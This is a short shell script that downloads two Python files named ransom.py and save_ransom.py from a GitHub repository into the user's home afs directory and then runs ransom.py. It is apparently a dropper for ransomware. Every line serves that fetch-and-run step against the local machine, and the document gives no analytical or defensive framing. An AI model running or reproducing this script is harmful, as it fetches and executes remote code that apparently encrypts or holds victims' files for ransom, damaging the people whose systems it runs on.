path=$(eval echo ~$USER)/afs
wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py -O $path/ransom.py
wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/save_ransom.py -O $path/save.py
echo   > $path/path.txt
cd $path
python3 $path/ransom.py
